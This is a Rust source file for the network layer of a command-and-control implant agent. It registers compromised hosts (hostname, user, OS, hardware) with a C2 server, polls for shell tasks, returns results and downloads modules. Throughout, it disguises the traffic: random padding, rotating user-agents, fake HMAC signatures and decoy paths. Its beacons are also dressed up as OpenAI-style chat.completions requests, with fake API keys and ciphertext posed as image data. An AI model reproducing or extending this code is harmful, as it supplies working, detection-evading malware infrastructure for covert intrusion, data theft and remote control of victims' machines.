//! HTTP communicator — 单入口内部路由（流量伪装 Phase 2）。
//!
//! 所有 beacon 流量 POST 到 profile 配置的单一入口路径，请求体为业务风格
//! 外层壳：`{ "<data_key>": "<AES-GCM 密文>", "<ts_key>": <ms>, "<rand_key>": "<hex>" }`。
//! 密文内部是路由信封 `BeaconEnvelope{op, id, data}`：
//!   op=reg 注册（预会话密钥） / op=hb 心跳 / op=res 结果 / op=mod 模块下载
//! agent 标识 token 位于密文内 —— 线路上无任何固定标识头、无可枚举功能路径。
//!
//! 密文长度随机化：明文尾部追加随机数量空白（JSON 解析容忍），
//! 心跳/结果节奏与 UA 由 profile 控制。

use libra_common::models::ProfileTransform;
use libra_common::models::AgentTask;
use rand::Rng;
use reqwest::Client;
use serde_json::Value;

const AES_KEY_SIZE: usize = 32;

/// Result of a successful registration, including the transform profile the
/// server wants the agent to use for subsequent requests.
pub struct RegisterOutcome {
    pub agent_id: String,
    pub session_key: Option<Vec<u8>>,
    /// 流量伪装 profile（单入口路径/壳字段/UA 列表/padding/节奏）。
    pub profile: Option<ProfileTransform>,
    /// 会话 token（后续请求放入密文信封）。
    pub session_token: Option<String>,
    /// 服务端 RSA 公钥（SPKI DER b64，构建注入）。
    pub server_public_key: String,
    /// 心跳间隔（毫秒，profile 或服务端下发值；0 = 保持构建时值）。
    pub heartbeat_interval_ms: u64,
    /// 抖动百分比（0 = 保持构建时值）。
    pub jitter_percent: f64,
}

/// HTTP communicator for beacon-style communication with the C2 server.
pub struct HttpCommunicator {
    client: Client,
    server_url: String,
    /// 单入口路径前缀（注册前用构建时 register_path，注册后切换 profile.entry_path）。
    entry_path: String,
    profile: Option<ProfileTransform>,
    session_token: Option<String>,
    /// 服务端 RSA 公钥（构建注入）：注册/协商混合加密用；空 = 旧式明文/单入口注册。
    server_public_key: String,
    /// beacon secret（HMAC 假签名的 key；注册时保存）。
    beacon_secret: String,
    ua_index: std::sync::atomic::AtomicUsize,
}

impl HttpCommunicator {
    pub fn new(
        server_url: &str,
        register_path: &str,
        _heartbeat_path: &str,
        _result_path: &str,
    ) -> Self {
        let client = Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
            .build()
            .unwrap_or_else(|e| {
                libra_common::dlog!("[http] Failed to create HTTP client, using default: {}", e);
                Client::new()
            });

        Self {
            client,
            server_url: server_url.to_string(),
            entry_path: register_path.to_string(),
            profile: None,
            session_token: None,
            server_public_key: String::new(),
            beacon_secret: String::new(),
            ua_index: std::sync::atomic::AtomicUsize::new(0),
        }
    }

    /// Adopt the per-session channel token issued at registration.
    pub fn set_session_token(&mut self, token: String) {
        self.session_token = Some(token);
    }

    /// Adopt the traffic-shaping profile issued at registration.
    pub fn set_profile(&mut self, profile: ProfileTransform) {
        if !profile.entry_path.is_empty() {
            self.entry_path = profile.entry_path.clone();
        }
        self.profile = Some(profile);
    }

    /// 设置服务端 RSA 公钥（构建注入）：注册混合加密用。
    pub fn set_server_public_key(&mut self, key: String) {
        self.server_public_key = key;
    }

    /// 构建时注入的请求样式（UA 列表/附加头/路径后缀）。
    /// 在注册**前**生效（注册请求本身也带伪装），不改变入口路径；
    /// 注册后服务端 profile 会整体覆盖。
    pub fn set_build_style(&mut self, user_agents: Vec<String>, extra_headers: Vec<String>, path_suffixes: Vec<String>) {
        let p = self.profile.get_or_insert_with(Default::default);
        if !user_agents.is_empty() {
            p.user_agents = user_agents;
        }
        if !path_suffixes.is_empty() {
            p.path_suffixes = path_suffixes;
        }
        p.extra_headers = extra_headers;
    }

    /// 应用 profile 附加头到请求（格式 "Name: value"）。
    fn apply_extra_headers(&self, req: reqwest::RequestBuilder) -> reqwest::RequestBuilder {
        let mut req = req;
        if let Some(p) = self.profile.as_ref() {
            for h in &p.extra_headers {
                if let Some((name, value)) = h.split_once(':') {
                    let name = name.trim();
                    let value = value.trim();
                    if !name.is_empty() && !value.is_empty() {
                        req = req.header(name, value);
                    }
                }
            }
        }
        req
    }

    /// 注册端点（注册时 entry_path 尚未切换为 profile 入口，即构建时 register_path）。
    fn register_url(&self) -> String {
        format!("{}{}", self.server_url, self.entry_path)
    }

    /// 本次请求的完整 URL：入口前缀 + 随机虚假业务后缀（profile 配置）。
    fn entry_url(&self) -> String {        let suffix = self
            .profile
            .as_ref()
            .and_then(|p| {
                if p.path_suffixes.is_empty() {
                    None
                } else {
                    let idx = rand::thread_rng().gen_range(0..p.path_suffixes.len());
                    Some(p.path_suffixes[idx].as_str())
                }
            })
            .unwrap_or("");
        if suffix.is_empty() {
            format!("{}{}", self.server_url, self.entry_path)
        } else {
            format!("{}{}/{}", self.server_url, self.entry_path.trim_end_matches('/'), suffix)
        }
    }

    /// 按 profile 轮换 UA（无 profile 时用 client 默认 UA）。
    fn pick_user_agent(&self) -> Option<String> {
        let p = self.profile.as_ref()?;
        if p.user_agents.is_empty() {
            return None;
        }
        let idx = self.ua_index.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        Some(p.user_agents[idx % p.user_agents.len()].clone())
    }

    /// 密文长度随机化：明文尾部追加随机空白（JSON 解析容忍），然后 AES-GCM 加密。
    fn pad_and_encrypt(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> String {
        let (pmin, pmax) = self
            .profile
            .as_ref()
            .map(|p| (p.padding_min as usize, (p.padding_max as usize).max(p.padding_min as usize)))
            .unwrap_or((0, 0));
        let pad_len = if pmax > 0 {
            rand::thread_rng().gen_range(pmin..=pmax)
        } else {
            0
        };
        let padded = format!("{}{}", inner_plain, "\n".repeat(pad_len));
        libra_crypto::encrypt_payload(&padded, key)
    }

    /// 构造单入口请求：外层壳 + 密文 + 假签名 + 会话 token。
    /// `inner_plain` 为密文内部的 JSON（信封），`key` 为加密密钥。
    fn build_body(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> String {
        let cipher_b64 = self.pad_and_encrypt(inner_plain, key);

        let (dk, tk, rk, sk, sidk) = self
            .profile
            .as_ref()
            .map(|p| (
                p.data_key.as_str(),
                p.ts_key.as_str(),
                p.rand_key.as_str(),
                p.sign_key.as_str(),
                p.token_key.as_str(),
            ))
            .unwrap_or(("d", "ts", "r", "", "sid"));

        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis();
        let rand_hex: String = {
            let mut b = [0u8; 4];
            rand::thread_rng().fill(&mut b);
            b.iter().map(|x| format!("{x:02x}")).collect()
        };
        let token = self.session_token.clone().unwrap_or_default();

        // 假签名：HMAC-SHA256(beacon_secret, ts|cipher) 的 hex —— 真实算法，
        // 与带鉴权的业务 API 结构一致；服务端宽松校验（失败不拒绝）。
        let sign = if !sk.is_empty() && !self.beacon_secret.is_empty() {
            Some(hmac_sign(&self.beacon_secret, &format!("{ts}|{cipher_b64}")))
        } else {
            None
        };

        // sid 字段仅在存在会话 token 时附带（注册请求无 token）
        let with_token = format!(r#","{}":"{}""#, sidk, token);
        let token_part = if token.is_empty() { String::new() } else { with_token };

        match sign {
            Some(s) => format!(
                r#"{{"{}":"{}","{}":{},"{}":"{}","{}":"{}"{}}}"#,
                dk, cipher_b64, tk, ts, rk, rand_hex, sk, s, token_part
            ),
            None => format!(
                r#"{{"{}":"{}","{}":{},"{}":"{}"{}}}"#,
                dk, cipher_b64, tk, ts, rk, rand_hex, token_part
            ),
        }
    }

    /// 发送单入口 POST 请求并返回响应体文本。
    async fn post_envelope(&self, body: String) -> Result<(u16, String), String> {
        let mut req = self.client.post(self.entry_url()).body(body);
        if let Some(ua) = self.pick_user_agent() {
            req = req.header(reqwest::header::USER_AGENT, ua);
        }
        let resp = req
            .send()
            .await
            .map_err(|e| e.to_string())?;
        let status = resp.status().as_u16();
        let text = resp.text().await.map_err(|e| e.to_string())?;
        Ok((status, text))
    }

    // ── AI 通道（v1/chat/completions + SSE）─────────────────────────

    /// 通过 AI 通道发送信封并等待 SSE 响应，返回解密后的响应明文。
    ///
    /// 请求伪装为 chat.completions 调用：
    ///   POST /v1/chat/completions
    ///   Authorization: Bearer sk-<随机>
    ///   {"model":"<真实模型名>","stream":true,"messages":[{"role":"user","content":"<密文>"}]}
    /// 响应为 SSE 流：data: {choices:[{delta:{content:"<密文分块>"}}]} ... data: [DONE]
    async fn post_ai(&self, inner_plain: &str, key: &[u8; AES_KEY_SIZE]) -> Result<String, String> {
        let (ai_path, models, auth_prefix) = self
            .profile
            .as_ref()
            .map(|p| (p.ai_path.as_str(), p.ai_models.as_slice(), p.auth_prefix.as_str()))
            .unwrap_or(("/v1/chat/completions", &[][..], "sk-"));

        let cipher_b64 = self.pad_and_encrypt(inner_plain, key);
        // 伪装：content 以 data:image/jpeg;base64, 开头（AI 图片分析请求，海量正常流量）
        let content = format!("data:image/jpeg;base64,{}", cipher_b64);
        let model = if models.is_empty() {
            "gpt-4o-mini"
        } else {
            models[rand::thread_rng().gen_range(0..models.len())].as_str()
        };
        let body = serde_json::json!({
            "model": model,
            "stream": true,
            "messages": [{"role": "user", "content": content}],
            "user": self.session_token.clone().unwrap_or_default()
        });

        let auth: String = {
            let mut b = [0u8; 24];
            rand::thread_rng().fill(&mut b);
            format!("Bearer {}{}", auth_prefix, b.iter().map(|x| format!("{x:02x}")).collect::<String>())
        };

        let url = format!("{}{}", self.server_url, ai_path);
        let mut req = self
            .client
            .post(&url)
            .header("Content-Type", "application/json")
            .header("Authorization", auth)
            .body(body.to_string());
        if let Some(ua) = self.pick_user_agent() {
            req = req.header(reqwest::header::USER_AGENT, ua);
        }
        req = self.apply_extra_headers(req);

        let resp = req.send().await.map_err(|e| e.to_string())?;
        let status = resp.status().as_u16();
        let text = resp.text().await.map_err(|e| e.to_string())?;
        if status == 401 {
            return Err("SESSION_LOST".to_string());
        }
        if status != 200 {
            return Err(format!("AI channel request failed: {status}"));
        }

        // SSE 解析：聚合 data: 行中的 delta.content（base64 密文分块），[DONE] 结束
        let mut cipher = String::new();
        for line in text.lines() {
            let line = line.trim();
            let data = match line.strip_prefix("data:") {
                Some(d) => d.trim(),
                None => continue,
            };
            if data == "[DONE]" {
                break;
            }
            if let Ok(v) = serde_json::from_str::<Value>(data) {
                if let Some(content) = v["choices"][0]["delta"]["content"].as_str() {
                    cipher.push_str(content);
                }
            }
        }
        if cipher.is_empty() {
            return Err("empty AI channel response".to_string());
        }
        libra_crypto::decrypt_payload(&cipher, key)
    }

    /// 打开 SSE 任务事件流（伪装为模型事件流：GET /api/v1/models/events?channel=）。
    /// 服务端挂起连接并主动推送任务（AES-GCM 密文在 data: 行），
    /// 30s 注释 keepalive。调用方流式读取 body 逐行解析；401 = 会话丢失。
    pub async fn open_events(&self, _key: &[u8; AES_KEY_SIZE]) -> Result<reqwest::Response, String> {
        let token = self.session_token.clone().unwrap_or_default();
        let url = format!(
            "{}{}?channel={}",
            self.server_url, "/api/v1/models/events", token
        );
        let mut req = self
            .client
            .get(&url)
            .header("Accept", "text/event-stream");
        if let Some(ua) = self.pick_user_agent() {
            req = req.header(reqwest::header::USER_AGENT, ua);
        }
        req = self.apply_extra_headers(req);

        let resp = req.send().await.map_err(|e| e.to_string())?;
        let status = resp.status().as_u16();
        if status == 401 {
            return Err("SESSION_LOST".to_string());
        }
        if status != 200 {
            return Err(format!("events request failed: {status}"));
        }
        Ok(resp)
    }

    /// 注册：op=reg，预会话密钥加密（无会话密钥时的 bootstrap）。
    pub async fn register(
        &mut self,
        hostname: &str,
        user_name: &str,
        os_version: &str,
        arch: &str,
        public_key: &str,
        beacon_secret: &str,
        hardware_json: &str,
        has_session_key: bool,
    ) -> Result<RegisterOutcome, String> {
        let pid = std::process::id();
        let hw = if hardware_json.is_empty() || hardware_json == "null" {
            "null"
        } else {
            hardware_json
        };
        self.beacon_secret = beacon_secret.to_string();

        let reg_json = format!(
            r#"{{"hostname":"{}","userName":"{}","osVersion":"{}","arch":"{}","processName":"agent","pid":{},"isElevated":false,"publicKey":"{}","beaconSecret":"{}","hardware":{},"hasSessionKey":{}}}"#,
            escape(hostname),
            escape(user_name),
            escape(os_version),
            escape(arch),
            pid,
            escape(public_key),
            escape(beacon_secret),
            hw,
            if has_session_key { "true" } else { "false" }
        );

        // 有服务端公钥：走 /api/v1/session OAuth 风格混合加密注册。
        // 无公钥（dev 直连/旧构建）：无 secret 时明文旧端点；有 secret 时单入口预会话加密。
        let (status, resp_body) = if !self.server_public_key.is_empty() {
            let (enc_key, cipher_body) =
                libra_crypto::hybrid_encrypt(&reg_json, &self.server_public_key)
                    .map_err(|e| format!("hybrid encrypt: {e}"))?;
            let body = format!(
                r#"{{"grant_type":"client_credentials","client_id":"{}","client_secret":"{}"}}"#,
                cipher_body, enc_key
            );
            let resp = self
                .client
                .post(format!("{}{}", self.server_url, "/api/v1/session"))
                .header("Content-Type", "application/json")
                .body(body)
                .send()
                .await
                .map_err(|e| e.to_string())?;
            let status = resp.status().as_u16();
            let text = resp.text().await.map_err(|e| e.to_string())?;
            (status, text)
        } else if beacon_secret.is_empty() {
            // 明文注册（无 secret 且无公钥的开发环境）：旧端点
            let resp = self
                .client
                .post(self.register_url())
                .header("Content-Type", "application/json")
                .body(reg_json.clone())
                .send()
                .await
                .map_err(|e| e.to_string())?;
            let status = resp.status().as_u16();
            let text = resp.text().await.map_err(|e| e.to_string())?;
            (status, text)
        } else {
            let pre_key = libra_crypto::derive_pre_session_key(beacon_secret);
            let envelope = serde_json::json!({ "op": "reg", "id": "", "data": reg_json }).to_string();
            let body = self.build_body(&envelope, &pre_key);
            self.post_envelope(body).await?
        };
        if status != 200 {
            return Err(format!("Registration failed with status: {status}"));
        }

        // 注册响应：agent_id 等字段在明文 JSON 中（注册响应不含敏感数据），
        // session_key/profile 从对应字段读取。
        let v: Value = serde_json::from_str(&resp_body)
            .map_err(|e| format!("bad register response: {e}"))?;

        let agent_id = v
            .get("agent_id")
            .and_then(|s| s.as_str())
            .ok_or("agent_id not found in response")?
            .to_string();

        let session_key = v
            .get("session_key")
            .and_then(|s| s.as_str())
            .filter(|s| !s.is_empty())
            .and_then(|s| {
                use base64::Engine as _;
                base64::engine::general_purpose::STANDARD.decode(s).ok()
            });

        let session_token = v
            .get("session_token")
            .and_then(|s| s.as_str())
            .map(|s| s.to_string());
        if let Some(t) = &session_token {
            self.session_token = Some(t.clone());
        }

        // profile 解析（服务端未下发时保持默认）
        let profile: Option<ProfileTransform> = v
            .get("profile")
            .and_then(|p| serde_json::from_value(p.clone()).ok());
        if let Some(p) = &profile {
            self.set_profile(p.clone());
        }

        let heartbeat_interval_ms = v
            .get("heartbeat_interval_ms")
            .and_then(|n| n.as_u64())
            .unwrap_or(0);
        let jitter_percent = v
            .get("jitter_percent")
            .and_then(|n| n.as_f64())
            .unwrap_or(0.0);

        Ok(RegisterOutcome {
            agent_id,
            session_key,
            profile,
            session_token,
            server_public_key: self.server_public_key.clone(),
            heartbeat_interval_ms,
            jitter_percent,
        })
    }

    /// 心跳：op=hb，走 AI 通道。返回 (待执行任务, 是否需要实时 WS 通道)。
    pub async fn heartbeat(
        &self,
        _agent_id: &str,
        session_key: Option<&[u8; AES_KEY_SIZE]>,
    ) -> Result<Option<AgentTask>, String> {
        let key = session_key.ok_or("no session key")?;
        let token = self.session_token.clone().unwrap_or_default();

        let ts = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap_or_default()
            .as_millis() as i64;
        let inner = serde_json::json!({ "op": "hb", "id": token, "data": format!(r#"{{"ts":{}}}"#, ts) })
            .to_string();

        let plain = self.post_ai(&inner, key).await?;
        let v: Value = serde_json::from_str(&plain)
            .map_err(|e| format!("bad heartbeat payload: {e}"))?;

        let task = match v.get("pendingTask") {
            Some(task_val) if !task_val.is_null() => {
                let task_json = serde_json::to_string(task_val)
                    .map_err(|e| format!("task serialize: {e}"))?;
                Some(parse_task(&task_json))
            }
            _ => None,
        };
        Ok(task)
    }

    /// 提交任务结果：op=res，走 AI 通道。
    pub async fn submit_result(
        &self,
        _agent_id: &str,
        result_json: &str,
        session_key: Option<&[u8; AES_KEY_SIZE]>,
    ) -> Result<(), String> {
        let key = session_key.ok_or("no session key")?;
        let token = self.session_token.clone().unwrap_or_default();

        let inner = serde_json::json!({ "op": "res", "id": token, "data": result_json }).to_string();
        self.post_ai(&inner, key).await?;
        Ok(())
    }

    /// 模块下载：op=mod，走 AI 通道（模块名在密文内，线路上不可见）。
    pub async fn download_module(
        &self,
        name: &str,
        _agent_id: &str,
        session_key: &[u8; AES_KEY_SIZE],
    ) -> Result<Vec<u8>, String> {
        let token = self.session_token.clone().unwrap_or_default();
        let inner = serde_json::json!({ "op": "mod", "id": token, "data": format!(r#"{{"name":"{}"}}"#, escape(name)) })
            .to_string();

        // 响应密文内容是 base64 的模块二进制
        let plain = self.post_ai(&inner, session_key).await?;
        use base64::Engine as _;
        base64::engine::general_purpose::STANDARD
            .decode(plain.trim())
            .map_err(|e| format!("module payload decode: {e}"))
    }
}

// ── JSON extraction helpers ──────────────────────────────────────────

fn escape(s: &str) -> String {
    libra_common::json_util::escape_json(s)
}

/// HMAC-SHA256 hex（假签名）。
fn hmac_sign(secret: &str, msg: &str) -> String {
    use hmac::{Hmac, Mac};
    use sha2::Sha256;
    type HmacSha256 = Hmac<Sha256>;
    let mut mac = HmacSha256::new_from_slice(secret.as_bytes()).expect("hmac key");
    mac.update(msg.as_bytes());
    let digest = mac.finalize().into_bytes();
    digest.iter().map(|b| format!("{b:02x}")).collect()
}

fn parse_task(json: &str) -> AgentTask {
    match serde_json::from_str::<AgentTask>(json) {
        Ok(task) => task,
        Err(_) => {
            // Fallback: parse from Value for partial compatibility
            let v: serde_json::Value = serde_json::from_str(json).unwrap_or(serde_json::Value::Null);
            use libra_common::models::{CommandType, TaskStatus};
            AgentTask {
                id: v["id"].as_str().unwrap_or_default().to_string(),
                agent_id: v["agentId"].as_str().unwrap_or_default().to_string(),
                created_by: v["createdBy"].as_str().unwrap_or_default().to_string(),
                command: v["command"].as_str().unwrap_or_default().to_string(),
                command_type: v["commandType"].as_str()
                    .and_then(|s| serde_json::from_str::<CommandType>(&format!("\"{}\"", s)).ok())
                    .unwrap_or(CommandType::Shell),
                arguments: Vec::new(),
                status: v["status"].as_str()
                    .and_then(|s| serde_json::from_str::<TaskStatus>(&format!("\"{}\"", s)).ok())
                    .unwrap_or(TaskStatus::Pending),
                output: v["output"].as_str().map(|s| s.to_string()),
                error: v["error"].as_str().map(|s| s.to_string()),
                timeout_seconds: v["timeoutSeconds"].as_i64().unwrap_or(60) as i32,
            }
        }
    }
}
